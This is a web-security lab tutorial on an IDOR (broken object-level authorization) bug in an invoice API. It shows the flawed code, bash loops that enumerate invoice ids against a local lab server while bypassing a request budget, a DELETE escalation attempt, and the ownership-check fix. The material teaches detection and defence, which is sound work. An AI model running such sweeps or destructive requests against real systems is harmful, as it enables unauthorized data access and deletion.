# Lab 06 — Invoices

## The bug

```python
who = req.cookies.get("account", "77")
row = INVOICES.get(wanted)
return js({"viewer_account": int(who), **row})
```

`who` is read, echoed, and never compared to `row["account"]`. This is the most
common serious web vulnerability there is, and it never looks like a hole in the
code — it looks like a line that is missing.

The generic name is **broken object-level authorization**: the app authenticates
the caller and then authorises nothing about the object.

## Finding it

You have one id and one account number. Ask for the neighbours.

```bash
h5i browser open 'http://127.0.0.1:9060/api/invoice?id=1041' --session lab06 --new --capture

for id in $(seq 1035 1045); do
  printf '%s ' "$id"
  h5i websec replay req_0 --session lab06 --reset-budget --set query.id=$id |
    python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["status"])'
done
```

Every one answers 200. That is the finding — not the flag, the *pattern*. Now
widen and read the bodies for the one that is shaped differently.

## `--reset-budget`, and why a sweep needs it

An h5i session gives each page a bounded network allowance. It exists to contain
*page* code: a script in a loop is the untrusted thing it stops. A deliberate
sweep is the opposite — hundreds of requests you composed — and without
`--reset-budget` it stops partway and every later probe reads as a negative
result. That is the worst way for a sweep to fail: silently, as evidence of
absence.

Rule: **any loop of more than a handful of replays takes `--reset-budget`.**

## Reading a sweep

Do not read fifty bodies. Read the one number that separates them:

```bash
for id in $(seq 1000 1050); do
  h5i websec replay req_0 --session lab06 --reset-budget --set query.id=$id |
    python3 -c 'import json,sys;r=json.load(sys.stdin);print(r["response"]["status"], r["response"]["bytes"])'
done | sort | uniq -c
```

Statuses cluster; sizes cluster; the outlier is the finding. On a real target
the same three-column habit (status, size, time) finds blind SQLi (Lab 13),
username enumeration, and rate-limit gaps.

## Escalating the finding

An IDOR you can read is a report. An IDOR you can *write* is an incident. Always
try the other verbs against the same object:

```bash
h5i websec replay req_0 --session lab06 --create --set query.id=1004 \
    --set method=DELETE
```

And always check whether the id is guessable at all — see Lab 07, where it is
not, and where that changes less than you would hope.

## The fix

```python
row = INVOICES.get(wanted)
if not row or row["account"] != session.account:
    return js({"error": "no such invoice"}, 404)
```

Two details worth copying: the ownership check is *in the same expression* as
the lookup, so a later refactor cannot separate them; and the answer for
"exists but is not yours" is 404, not 403, because a 403 confirms the id exists.

## h5i technique

`--reset-budget`; reading `response.status` and `response.bytes` out of the
replay reply instead of fetching bodies.
